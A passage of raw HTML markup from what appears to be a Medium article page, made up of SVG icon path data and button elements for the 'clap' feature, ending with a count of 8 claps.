5.68-.49-1.037c-.518-1.107-.426-2.13.224-2.89l-3.303-3.304a1.337 1.337 0 0 0-1.886 0 1.326 1.326 0 0 0-.39.944c0 .217.067.42.165.607zm14.787 19.184c-1.599 1.6-3.417 2.392-5.353 2.392-.349 0-.7-.03-1.058-.082a7.922 7.922 0 0 1-3.667.887c-3.049 0-6.115-1.626-8.359-3.87l-6.396-6.397A2.315 2.315 0 0 1 2 19.724a2.327 2.327 0 0 1 1.923-2.296l-.875-.875a2.339 2.339 0 0 1 0-3.3 2.33 2.33 0 0 1 1.24-.647l-.139-.139c-.91-.91-.91-2.39 0-3.3.884-.884 2.421-.882 3.301 0l.138.14a2.335 2.335 0 0 1 3.948-1.24l.093.092c.091-.423.291-.828.62-1.157a2.336 2.336 0 0 1 3.3 0l3.384 3.386a2.167 2.167 0 0 1 1.271-.173c.534.086 1.03.354 1.441.765.11-.549.415-1.034.911-1.418a2.12 2.12 0 0 1 1.661-.41c.727.117 1.385.565 1.853 1.262l3.652 6.423c1.704 2.832 2.025 7.377-2.205 11.607zM13.217.484l-1.917.882 2.37 2.837-.454-3.719zm8.487.877l-1.928-.86-.44 3.697 2.368-2.837zM16.5 3.293L15.478-.005h2.044L16.5 3.293z" fill-rule="evenodd"/></svg></span></span><span class="button-activeState"><span class="svgIcon svgIcon--clapFilled svgIcon--33px u-relative u-topNegative2 u-xs-top0"><svg class="svgIcon-use" width="33" height="33" ><g fill-rule="evenodd"><path d="M29.58 17.1l-3.854-6.78c-.365-.543-.876-.899-1.431-.989a1.491 1.491 0 0 0-1.16.281c-.42.327-.65.736-.7 1.207v.001l3.623 6.367c2.46 4.498 1.67 8.802-2.333 12.807-.265.265-.536.505-.81.728 1.973-.222 3.474-1.286 4.45-2.263 4.166-4.165 3.875-8.6 2.215-11.36zm-4.831.82l-3.581-6.3c-.296-.439-.725-.742-1.183-.815a1.105 1.105 0 0 0-.89.213c-.647.502-.755 1.188-.33 2.098l1.825 3.858a.601.601 0 0 1-.197.747.596.596 0 0 1-.77-.067L10.178 8.21c-.508-.506-1.393-.506-1.901 0a1.335 1.335 0 0 0-.393.95c0 .36.139.698.393.95v.001l5.61 5.61a.599.599 0 1 1-.848.847l-5.606-5.606c-.001 0-.002 0-.003-.002L5.848 9.375a1.349 1.349 0 0 0-1.902 0 1.348 1.348 0 0 0 0 1.901l1.582 1.582 5.61 5.61a.6.6 0 0 1-.848.848l-5.61-5.61c-.51-.508-1.393-.508-1.9 0a1.332 1.332 0 0 0-.394.95c0 .36.139.697.393.952l2.363 2.362c.002.001.002.002.002.003l3.52 3.52a.6.6 0 0 1-.848.847l-3.522-3.523h-.001a1.336 1.336 0 0 0-.95-.393 1.345 1.345 0 0 0-.949 2.295l6.779 6.78c3.715 3.713 9.327 5.598 13.49 1.434 3.527-3.528 4.21-7.13 2.086-11.015zM11.817 7.727c.06-.328.213-.64.466-.893.64-.64 1.755-.64 2.396 0l3.232 3.232c-.82.783-1.09 1.833-.764 2.992l-5.33-5.33z"/><path d="M13.285.48l-1.916.881 2.37 2.837z"/><path d="M21.719 1.361L19.79.501l-.44 3.697z"/><path d="M16.502 3.298L15.481 0h2.043z"/></g></svg></span></span></button><div class="clapUndo u-width60 u-round u-height32 u-absolute u-borderBox u-paddingRight5 u-transition--transform200Springu-backgroundGrayLighter js-clapUndo" style="top: 14px; padding: 2px;"><button class="button button--chromeless u-baseColor--buttonNormal button--withIcon button--withSvgIcon u-floatRight"  data-action="multivote-undo" data-action-value="edd877dfd724"><span class="svgIcon svgIcon--removeThin svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M20.13 8.11l-5.61 5.61-5.609-5.61-.801.801 5.61 5.61-5.61 5.61.801.8 5.61-5.609 5.61 5.61.8-.801-5.609-5.61 5.61-5.61" fill-rule="evenodd"/></svg></span></button></div></div><span class="u-relative u-background js-actionMultirecommendCount u-marginLeft16"><button class="button button--chromeless u-baseColor--buttonNormal js-multirecommendCountButton u-textColorDarker"  data-action="show-recommends" data-action-value="edd877dfd724">8 claps</button>
